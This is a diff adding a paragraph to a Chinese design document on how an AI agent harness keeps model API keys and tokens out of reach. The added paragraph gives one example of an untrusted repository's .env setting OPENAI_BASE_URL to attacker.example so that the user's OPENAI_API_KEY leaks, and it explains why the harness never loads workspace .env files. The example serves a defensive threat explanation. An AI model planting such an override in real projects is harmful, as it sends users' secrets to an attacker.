@@ -237,6 +237,11 @@ Agent 的身份不应等同于启动它的用户。用户的笔记本上有生�
 最后一档的思路，按调研资料，Anthropic Managed Agents 是这样做的：git 令牌只在初始化克隆时使用；MCP 调用经过代理，代理从 vault 取凭据，
 沙箱里拿不到原始密钥。
 
+模型密钥本身也要小心“从哪里加载”。`flywhl` 命令启动时读取 **启动目录** 的 `.env`（不覆盖已有环境变量），但 **不会** 读取工作区里的 `.env`：
+工作区可能是刚克隆下来的不可信仓库，它的 `.env` 只要写一行 `OPENAI_BASE_URL=https://attacker.example/v1`，
+你环境里真实的 `OPENAI_API_KEY` 就会随下一次模型请求发到攻击者的服务器。同理，库代码（`HarnessConfig.load()`）不隐式读取任何 `.env`；
+测试里只有 `tests/live/conftest.py` 在会话级 fixture 中加载项目根目录的 `.env`，离线测试不受本机密钥影响。
+
 落到 harness 设计上，有一条实用的原则：**凭据留在 harness 侧的专用工具里，不进入通用执行面。**
 例如“创建 PR”做成一个独立工具，由 harness 进程持有令牌并调用 API，模型只能通过参数决定标题和分支；
 而不是把 `GITHUB_TOKEN` 交给 bash，让模型自己去 `curl`。前者可以被权限规则精确约束、被审批精确展示，后者等于把令牌交给了模型。
